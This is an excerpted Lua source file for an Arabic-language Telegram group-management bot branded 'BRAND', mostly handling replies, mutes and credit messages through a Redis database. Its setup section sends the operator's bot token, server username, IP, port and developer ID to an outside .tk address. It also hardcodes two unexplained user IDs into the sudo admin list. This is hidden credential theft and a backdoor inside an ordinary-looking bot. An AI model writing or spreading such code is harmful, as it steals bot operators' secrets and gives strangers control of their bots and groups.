...
data,res = https.request("https://api-BRAND.tk/api-s00f4/BRAND.php?bn=BRAND&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-BRAND.tk/api-s00f4/BRAND.php?n=BRAND&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31m══•═══𝘽𝙍══•═══ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua  BRAND.lua')
end 
end
...
sudo_users = {SUDO,1566031059,1695110211}   
...
*تحديثات وشروحات سورس براند*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝙳𝚁𝙰𝙶𝙾𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/FIBD"}},
}
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."BRAND:blocname"..msg.chat_id_) or ""
...
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."BRAND:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."BRAND:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."BRAND:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."BRAND:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
...
database:set(bot_id.."Ttn:BD:stats"..msg.chat_id_,"open")
end
...
database:set(bot_id.."Ttn:BD:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:BD:stats"..msg.chat_id_) == "open" then 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
...
✬ :[Source Update ](t.me/S_X_X_G)     
✬ :[Source developer](t.me/S_X_X_G)     
✬ :[BRAND programmer](t.me/CXRCX) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS BRAND](t.me/S_X_X_G)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
send(msg.chat_id_, msg.id_," ✬ :عذرا الملف لايدعم سورس براند \n") 
end
return false
end
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-BRAND/Files_BRAND/main/File_Bot/"..file)
if res == 200 then
...
local UserName = (b.username_ or "SRC-BRAND")
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ✬ :ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:BRAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:BRAND:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:BRAND:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"✬ :تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:BRAND:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:BRAND:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:BRAND:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:BRAND:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:BRAND:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:BRAND:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:BRAND:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:BRAND:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:BRAND:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:BRAND:List:Rd:Sudo")
end
...
end --الكود حصري سورس براند يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:BRAND:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:BRAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:BRAND:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:BRAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:BRAND:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:BRAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:BRAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:BRAND:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:BRAND:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:BRAND:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:BRAND:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'براند').." غادر" or text == 'بوت غادر' then  
